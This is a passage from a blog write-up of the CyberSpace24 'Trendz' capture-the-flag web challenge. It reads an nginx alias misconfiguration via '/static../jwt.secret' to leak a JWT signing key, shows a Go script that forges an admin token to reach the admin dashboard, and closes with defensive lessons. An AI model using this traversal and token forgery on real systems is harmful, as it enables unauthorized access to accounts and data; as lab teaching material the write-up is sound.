</span></span></code></pre></div><p>This script initializes the Docker container environment. It generates a random JWT secret and sets various environment variables including flags and database credentials. It creates an initial SQL script for the database with user and post entries, starts the application and PostgreSQL, and then launches Nginx.</p><p>Since the actual challenge consists of 4 independent parts <code>(trend[number-of-z])</code>,
we can deduce based on the challenge name, that the flag we&rsquo;re looking for is <code>ADMIN_FLAG</code>.</p><p>Let&rsquo;s search in the codebase to see where this flag is mentioned.</p><blockquote><p>Note: you can check the source code of the application alone, since the code base is a bit
bigger than what a writeup could handle, I&rsquo;ll entrust the process of understanding the api to you.</p></blockquote><p>Searching for the keyword, we get one occurrence in <code>handlers/dashboard/AdminDash.go</code>, more specifically
in the <code>AdminDashboard</code> function that looks like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kd>func</span> <span class=nf>AdminDashboard</span><span class=p>(</span><span class=nx>ctx</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>posts</span> <span class=o>:=</span> <span class=nx>service</span><span class=p>.</span><span class=nf>GetAllPosts</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=nx>ctx</span><span class=p>.</span><span class=nf>HTML</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=s>&#34;adminDash.tmpl&#34;</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;flag&#34;</span><span class=p>:</span>  <span class=nx>os</span><span class=p>.</span><span class=nf>Getenv</span><span class=p>(</span><span class=s>&#34;ADMIN_FLAG&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;posts&#34;</span><span class=p>:</span> <span class=nx>posts</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>})</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>If we are admin, we can view all the posts, among which is the desired post which contains the flag.</p><p>However, we have a problem, we&rsquo;re mere <code>users</code>, how can we change our role to <code>admin</code>.</p><blockquote><p>The application uses JWT tokens for access control. It uses accessToken only to validate
admins.</p></blockquote><hr><p>Let&rsquo;s dive deeper into the codebase, where is the <code>AdminDashboard</code> mentioned again?</p><p><img alt=admin-dashboard-in-codebase loading=lazy src=/blog/images/2024-09-02-12-15-11.png></p><p>One occurence in the <code>main.go</code> script under the <code>admin</code> group. To access the admin dashboard, we first
have to validate the access token, then we have to validate the admin. Let&rsquo;s check the code for both:</p><h3 id=jwtauthgo><code>JWTAuth.go</code><a hidden class=anchor aria-hidden=true href=#jwtauthgo>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kd>func</span> <span class=nf>ValidateAccessToken</span><span class=p>(</span><span class=nx>encodedToken</span> <span class=kt>string</span><span class=p>)</span> <span class=p>(</span><span class=o>*</span><span class=nx>jwt</span><span class=p>.</span><span class=nx>Token</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>jwt</span><span class=p>.</span><span class=nf>Parse</span><span class=p>(</span><span class=nx>encodedToken</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>token</span> <span class=o>*</span><span class=nx>jwt</span><span class=p>.</span><span class=nx>Token</span><span class=p>)</span> <span class=p>(</span><span class=kd>interface</span><span class=p>{},</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>_</span><span class=p>,</span> <span class=nx>isValid</span> <span class=o>:=</span> <span class=nx>token</span><span class=p>.</span><span class=nx>Method</span><span class=p>.(</span><span class=o>*</span><span class=nx>jwt</span><span class=p>.</span><span class=nx>SigningMethodHMAC</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>!</span><span class=nx>isValid</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Errorf</span><span class=p>(</span><span class=s>&#34;invalid token with signing method: %v&#34;</span><span class=p>,</span> <span class=nx>token</span><span class=p>.</span><span class=nx>Header</span><span class=p>[</span><span class=s>&#34;alg&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=p>[]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>secretKey</span><span class=p>),</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>	<span class=p>})</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This Go function validates a JWT by parsing it and checking the signing method. It ensures the token uses HMAC signing and verifies it with a secret key. If the signing method is incorrect, it returns an error.</p><p>The secret key is found in the <code>jwt.secret</code> a the root of the application. Seeems we needs to retrieve that hmmm&mldr;</p><p>Okay, Let&rsquo;s check the admin validation code:</p><h3 id=validateadmingo><code>ValidateAdmin.go</code><a hidden class=anchor aria-hidden=true href=#validateadmingo>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kd>func</span> <span class=nf>ValidateAdmin</span><span class=p>()</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>HandlerFunc</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=kd>const</span> <span class=nx>bearerSchema</span> <span class=p>=</span> <span class=s>&#34;Bearer &#34;</span>
</span></span><span class=line><span class=cl>		<span class=kd>var</span> <span class=nx>tokenDetected</span> <span class=kt>bool</span> <span class=p>=</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl>		<span class=kd>var</span> <span class=nx>tokenString</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>		<span class=nx>authHeader</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>GetHeader</span><span class=p>(</span><span class=s>&#34;Authorization&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>authHeader</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>tokenDetected</span> <span class=p>=</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>			<span class=nx>tokenString</span> <span class=p>=</span> <span class=nx>authHeader</span><span class=p>[</span><span class=nb>len</span><span class=p>(</span><span class=nx>bearerSchema</span><span class=p>):]</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>!</span><span class=nx>tokenDetected</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=kd>var</span> <span class=nx>err</span> <span class=kt>error</span>
</span></span><span class=line><span class=cl>			<span class=nx>tokenString</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Cookie</span><span class=p>(</span><span class=s>&#34;accesstoken&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=nx>tokenString</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=o>||</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nx>c</span><span class=p>.</span><span class=nf>Redirect</span><span class=p>(</span><span class=mi>302</span><span class=p>,</span> <span class=s>&#34;/getAccessToken?redirect=&#34;</span><span class=o>+</span><span class=nx>c</span><span class=p>.</span><span class=nx>Request</span><span class=p>.</span><span class=nx>URL</span><span class=p>.</span><span class=nx>Path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=nx>tokenString</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>claims</span> <span class=o>:=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nf>ExtractClaims</span><span class=p>(</span><span class=nx>tokenString</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>claims</span><span class=p>[</span><span class=s>&#34;role&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s>&#34;admin&#34;</span> <span class=o>||</span> <span class=nx>claims</span><span class=p>[</span><span class=s>&#34;role&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s>&#34;superadmin&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=nx>claims</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Token is not valid&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=nx>c</span><span class=p>.</span><span class=nf>AbortWithStatusJSON</span><span class=p>(</span><span class=mi>403</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;error&#34;</span><span class=p>:</span> <span class=s>&#34;User Unauthorized&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This Go function is a Gin middleware that checks if the request has a valid JWT token with an &ldquo;admin&rdquo; or &ldquo;superadmin&rdquo; role. It first looks for the token in the &ldquo;Authorization&rdquo; header or a cookie. If not found or invalid, it redirects the user to obtain an access token or returns a 403 Unauthorized error.</p><p>Interesting, if we can craft our own valid JWT token, with role <code>admin</code> (or <code>superadmin</code>, but that&rsquo;s for another challenge),
we can access the admin dashboard, from which we can retrieve the hidden post that has the flag.</p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>You should note, that without the <code>jwt.secret</code> contents, we can&rsquo;t do anything.</p><p>We are not given a custom nginx configuration for nothing though, if we check the config</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user  nobody<span class=p>;</span>
</span></span><span class=line><span class=cl>worker_processes  auto<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>events <span class=o>{</span>
</span></span><span class=line><span class=cl>    worker_connections  1024<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http <span class=o>{</span>
</span></span><span class=line><span class=cl>    include       mime.types<span class=p>;</span>
</span></span><span class=line><span class=cl>    default_type  application/octet-stream<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    sendfile        on<span class=p>;</span>
</span></span><span class=line><span class=cl>    keepalive_timeout  65<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    server <span class=o>{</span>
</span></span><span class=line><span class=cl>        listen       80<span class=p>;</span>
</span></span><span class=line><span class=cl>        server_name  localhost<span class=p>;</span>
</span></span><span class=line><span class=cl>        location / <span class=o>{</span>
</span></span><span class=line><span class=cl>            proxy_pass http://localhost:8000<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        location /static <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=nb>alias</span> /app/static/<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        error_page   <span class=m>500</span> <span class=m>502</span> <span class=m>503</span> <span class=m>504</span>  /50x.html<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>location</span> <span class=o>=</span> /50x.html <span class=o>{</span>
</span></span><span class=line><span class=cl>            root   html<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>We can see that <code>/static</code> is aliased to <code>/app/static/</code>, with no restriction for
which files we can access (including jwt.secret), thus enabling us to navigate to <code>/static../jwt.secret</code>,
which is aliased to <code>/app/static/../jwt.secret</code>, that is the secret key used to sign the JWT token.</p><p>Great! we got the key. Now let&rsquo;s craft our valid JWT token using the following script</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;time&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=s>&#34;github.com/golang-jwt/jwt/v5&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>secretKey</span> <span class=p>=</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>InitJWT</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>key</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>ReadFile</span><span class=p>(</span><span class=s>&#34;jwt.secret&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>panic</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>secretKey</span> <span class=p>=</span> <span class=nx>key</span><span class=p>[:]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>GenerateAccessToken</span><span class=p>(</span><span class=nx>username</span> <span class=kt>string</span><span class=p>,</span> <span class=nx>role</span> <span class=kt>string</span><span class=p>)</span> <span class=p>(</span><span class=kt>string</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>token</span> <span class=o>:=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nf>NewWithClaims</span><span class=p>(</span><span class=nx>jwt</span><span class=p>.</span><span class=nx>SigningMethodHS256</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>jwt</span><span class=p>.</span><span class=nx>MapClaims</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;username&#34;</span><span class=p>:</span> <span class=nx>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;exp&#34;</span><span class=p>:</span>      <span class=nx>time</span><span class=p>.</span><span class=nf>Now</span><span class=p>().</span><span class=nf>Add</span><span class=p>(</span><span class=nx>time</span><span class=p>.</span><span class=nx>Minute</span> <span class=o>*</span> <span class=mi>10</span><span class=p>).</span><span class=nf>Unix</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;role&#34;</span><span class=p>:</span>     <span class=nx>role</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;iat&#34;</span><span class=p>:</span>      <span class=nx>time</span><span class=p>.</span><span class=nf>Now</span><span class=p>().</span><span class=nf>Unix</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>signedToken</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>token</span><span class=p>.</span><span class=nf>SignedString</span><span class=p>(</span><span class=nx>secretKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>signedToken</span> <span class=p>=</span> <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>signedToken</span><span class=p>,</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>InitJWT</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nx>token</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nf>GenerateAccessToken</span><span class=p>(</span><span class=s>&#34;hxuu&#34;</span><span class=p>,</span> <span class=s>&#34;admin&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Error generating token:&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Generated Token:&#34;</span><span class=p>,</span> <span class=nx>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><blockquote><p>jwt.secret is the file we downloaded previously.</p></blockquote><p>Running the script gives us a valid JWT Token.</p><p><img alt=generated-token loading=lazy src=/blog/images/2024-09-02-12-39-26.png></p><p>Now we just have to login as user <code>hxuu</code>, replace the <code>accesstoken</code> in the cookies with our
token, and access <code>/admin/dashboard</code>.</p><p><img alt=got-to-dashboard loading=lazy src=/blog/images/2024-09-02-12-41-09.png></p><p>Awesome, we can see the wanted post id. Let&rsquo;s access it using <code>/user/posts/&lt;id></code></p><p><img alt=flag loading=lazy src=/blog/images/2024-09-02-12-42-45.png></p><p>And there we go~ Flag is: <code>CSCTF{0a97afb3-64be-4d96-aa52-86a91a2a3c52}</code></p><hr><p>Lessons learned from this challenge:</p><ul><li><strong>JWT Secret Key Exposure</strong>: Ensuring sensitive files like JWT secrets are not publicly accessible is crucial to prevent unauthorized access.</li><li><strong>Token Crafting</strong>: Crafting a valid JWT token can allow you to bypass access controls if the secret key is known.</li><li><strong>Nginx Configuration</strong>: Be aware of Nginx configurations that could expose sensitive files through aliases or improper restrictions.</li><li><strong>Access Control</strong>: Properly validate and handle user roles and permissions to secure admin and sensitive functionalities.</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://hxuu.github.io/blog/tags/ctf/>Ctf</a></li><li><a href=https://hxuu.github.io/blog/tags/write-up/>Write-Up</a></li><li><a href=https://hxuu.github.io/blog/tags/cyberspace/>Cyberspace</a></li></ul><nav class=paginav><a class=prev href=https://hxuu.github.io/blog/ctf/pearl25/tic-tac-toe/><span class=title>« Prev</span><br><span>PearlCTF 25 - Web/Tic-Tac-Toe</span>
</a><a class=next href=https://hxuu.github.io/blog/ctf/cyberspace24/trendzz/><span class=title>Next »</span><br><span>CyberSpace24 - Trendzz</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendz on x" href="https://x.com/intent/tweet/?text=CyberSpace24%20-%20Trendz&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendz%2f&amp;hashtags=ctf%2cwrite-up%2ccyberspace"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendz on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendz%2f&amp;title=CyberSpace24%20-%20Trendz&amp;summary=CyberSpace24%20-%20Trendz&amp;source=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendz%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendz on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendz%2f&title=CyberSpace24%20-%20Trendz"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendz on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendz%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendz on whatsapp" href="https://api.whatsapp.com/send?text=CyberSpace24%20-%20Trendz%20-%20https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendz%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendz on telegram" href="https://telegram.me/share/url?text=CyberSpace24%20-%20Trendz&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendz%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendz on ycombinator" href="https://news.ycombinator.com/submitlink?t=CyberSpace24%20-%20Trendz&u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendz%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hxuu.github.io/blog/>hxuu</a></span> ·
<span>Powered by
